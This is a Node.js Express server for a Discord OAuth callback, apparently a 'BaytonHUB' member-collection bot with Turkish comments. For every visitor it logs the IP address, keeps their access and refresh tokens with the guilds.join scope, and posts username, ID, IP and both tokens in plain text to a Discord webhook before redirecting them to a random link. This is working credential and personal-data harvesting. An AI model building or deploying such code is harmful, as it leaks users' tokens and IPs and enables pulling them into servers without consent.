const express = require('express');
const app = express();
const path = require('path');
const mongoose = require('mongoose');
const config = require('./config');
const { WebhookClient } = require('discord.js');
const webhook = new WebhookClient({ url: config.webhookURL });
const fetch = require('node-fetch');
const { createUser, updateUser } = require('./src/Structures/Functions');
const { User } = require('./src/Models/index');
const { success, logErr, log, yellow } = require('./src/Structures/Functions');
const emoji = require('./src/Structures/Emojis.js');

// Random fonksiyonu
Array.prototype.random = function () {
    return this[Math.floor(Math.random() * this.length)];
};

// MongoDB bağlantısı
async function loadDatabase() {
    try {
        await mongoose.connect(config.mongo, {
            autoIndex: true,
            maxPoolSize: 10,
            serverSelectionTimeoutMS: 60000,
            socketTimeoutMS: 60000,
            family: 4,
        });
        success('Database loaded');
    } catch (err) {
        logErr(`Database error : ${err}`);
    }
}

// Ana HTML server
const htmlApp = express();
htmlApp.use(express.static(path.join(__dirname, 'html')));
htmlApp.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'html', 'index.html'));
});
htmlApp.listen(config.redirectport, () => {
    console.log(`HTML server listening at port ${config.redirectport}`);
});

// OAuth endpoint
app.get('/', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const { code } = req.query;

    log(`${ip} : Yeni Ziyaretçi`);

    if (!code || code.length < 30) return res.sendStatus(400);

    try {
        const oauthResult = await fetch('https://discord.com/api/oauth2/token', {
            method: 'POST',
            body: new URLSearchParams({
                client_id: config.clientID,
                client_secret: config.clientSecret,
                code,
                grant_type: 'authorization_code',
                redirect_uri: config.redirectURI,
                scope: 'identify guilds.join',
            }),
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        });

        const oauthData = await oauthResult.json();

        const userResult = await fetch('https://discord.com/api/users/@me', {
            headers: { authorization: `${oauthData.token_type} ${oauthData.access_token}` },
        });

        const userInfo = await userResult.json();
        if (userInfo.code == 0) {
            res.sendStatus(400);
            return logErr(`${ip} : Invalid code in URL`);
        }

        try {
            await fetch(
                `https://discord.com/api/v10/guilds/${config.guildId}/members/${userInfo.id}/roles/${config.roleId}`,
                { method: 'PUT', headers: { Authorization: `Bot ${config.token}` } }
            );
        } catch (error) { }

        const findUser = await User.findOne({ id: userInfo.id });
        yellow(`${'='.repeat(50)}`);
        success(`${ip} : Yeni Bağlantı ( ${userInfo.username}#${userInfo.discriminator} )`);
        if (!findUser) {
            sendWebhook(userInfo, oauthData, ip);
            createUser(userInfo, oauthData.access_token, oauthData.refresh_token);
        } else if (findUser.access_token !== oauthData.access_token) {
            sendWebhook(userInfo, oauthData, ip);
            updateUser(userInfo, {
                access_token: oauthData.access_token,
                refresh_token: oauthData.refresh_token,
            });
        } else {
            logErr(`User DB Error : ${userInfo.username}#${userInfo.discriminator} Zaten izin verdi.`);
        }
        yellow(`${'='.repeat(50)}`);
    } catch (err) {
        logErr(err);
    }

    res.redirect(config.redirectionBot.random());
});

// Webhook fonksiyonu
function sendWebhook(userInfo, oauthData, ip) {
    let avatarUrl = userInfo.avatar
        ? userInfo.avatar.startsWith('a_')
            ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}.gif?size=4096`
            : `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}.png?size=4096`
        : `https://cdn.discordapp.com/embed/avatars/0.png`;

    webhook.send({
        embeds: [{
            color: 3092790,
            description: `${emoji.progress} **Yeni Erişim**(BaytonHUB)`,
            thumbnail: { url: avatarUrl },
            fields: [
                { name: `${emoji.member} Kullanıcı Adı`, value: `\`\`\`ini\n[ @${userInfo.username} ]\`\`\`` },
                { name: `${emoji.author} IP Adresi`, value: `\`\`\`ini\n[ ${ip} ]\`\`\`` },
                { name: `${emoji.author} Kullanıcı ID`, value: `\`\`\`ini\n[ ${userInfo.id} ]\`\`\`` },
                { name: `${emoji.author} Erişim Tokeni`, value: `\`\`\`ini\n[ ${oauthData.access_token} ]\`\`\`` },
                { name: `${emoji.author} Yenileme Tokeni`, value: `\`\`\`ini\n[ ${oauthData.refresh_token} ]\`\`\`` }
            ],
            timestamp: new Date()
        }],
    }).catch(err => logErr(err));
}

// Ana server
const PORT = process.env.PORT || config.port;
app.listen(PORT, async () => {
    await loadDatabase();
    console.log(`OAuth server running on port ${PORT}`);
});
